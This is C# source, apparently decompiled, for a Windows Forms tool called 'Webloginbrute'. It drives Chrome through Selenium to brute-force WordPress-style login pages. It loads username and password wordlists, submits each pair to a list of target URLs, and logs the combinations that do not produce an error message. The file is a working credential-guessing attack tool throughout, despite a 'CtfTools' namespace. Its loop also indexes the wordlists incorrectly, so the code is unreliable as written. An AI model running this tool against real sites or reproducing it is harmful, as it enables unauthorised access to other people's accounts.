using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using DevComponents.DotNetBar;
using DevComponents.DotNetBar.Controls;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

namespace BekraHayrNesterCtfTools
{
	// Token: 0x0200000D RID: 13
	public partial class Webloginbrute : Form
	{
		// Token: 0x06000052 RID: 82 RVA: 0x0000742C File Offset: 0x0000562C
		public Webloginbrute()
		{
			Control.CheckForIllegalCrossThreadCalls = false;
			ChromeDriverService service = ChromeDriverService.CreateDefaultService();
			service.HideCommandPromptWindow = true;
			drv = new ChromeDriver(service);
			InitializeComponent();
		}

		// Token: 0x06000053 RID: 83 RVA: 0x0000747C File Offset: 0x0000567C
		private void kullanıcıAdıToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				op = new OpenFileDialog();
				bool flag = op.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					th = new Thread(new ThreadStart(kadi));
					th.Start();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "Bekra HayrNester");
			}
		}

		// Token: 0x06000054 RID: 84 RVA: 0x000074F8 File Offset: 0x000056F8
		private void kadi()
		{
			try
			{
				using (sr = File.OpenText(op.FileName))
				{
					for (string kelime = sr.ReadLine(); kelime != null; kelime = sr.ReadLine())
					{
						listBox1.Items.Add(kelime);
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "Bekra HayrNester");
			}
		}

		// Token: 0x06000055 RID: 85 RVA: 0x000075A0 File Offset: 0x000057A0
		private void ksfr()
		{
			try
			{
				using (sr = File.OpenText(op.FileName))
				{
					for (string kelime = sr.ReadLine(); kelime != null; kelime = sr.ReadLine())
					{
						listBox2.Items.Add(kelime);
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "Bekra HayrNester");
			}
		}

	
		private void kullanıcıŞifresiToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				op = new OpenFileDialog();
				bool flag = op.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					th = new Thread(new ThreadStart(ksfr));
					th.Start();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "Bekra HayrNester");
			}
		}


		private void buttonX1_Click(object sender, EventArgs e)
		{
			th = new Thread(new ThreadStart(brutes));
			th.Start();
		}

		private void brutes()
		{
			for (int i = 0; i < listBox3.Items.Count; i++)
			{
				drv.Navigate().GoToUrl(listBox3.Items[i].ToString());
				bool flag;
				do
				{
					flag = (drv.PageSource.ToString().IndexOf("wp-submit") != -1);
				}
				while (!flag);
				for (int j = 0; j < listBox1.Items.Count; j++)
				{
					Thread.Sleep(int.Parse(textBoxX5.Text));
					drv.FindElement(By.Id(textBoxX1.Text)).SendKeys(listBox1.Items[i].ToString());
					Thread.Sleep(int.Parse(textBoxX4.Text));
					drv.FindElement(By.Id(textBoxX2.Text)).SendKeys(listBox2.Items[i].ToString());
					drv.FindElement(By.Id(textBoxX3.Text)).Click();
					bool flag2 = drv.PageSource.ToString().IndexOf(mesaj) == -1;
					if (flag2)
					{
						listBox4.Items.Add(string.Concat(new string[]
						{
							listBox3.Items[i].ToString(),
							";",
							listBox1.Items[i].ToString(),
							";",
							listBox2.Items[i].ToString()
						}));
					}
				}
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x000078FB File Offset: 0x00005AFB
		private void Webloginbrute_FormClosing(object sender, FormClosingEventArgs e)
		{
			drv.Quit();
		}

		// Token: 0x0600005A RID: 90 RVA: 0x0000790A File Offset: 0x00005B0A
		private void işlemleriDurdurToolStripMenuItem_Click(object sender, EventArgs e)
		{
			th.Abort();
		}

		// Token: 0x0400007B RID: 123
		public IWebDriver drv;

		// Token: 0x0400007C RID: 124
		private OpenFileDialog op;

		// Token: 0x0400007D RID: 125
		private Thread th;

		// Token: 0x0400007E RID: 126
		private StreamReader sr;

		// Token: 0x0400007F RID: 127
		private string mesaj = "HATA";
	}
}
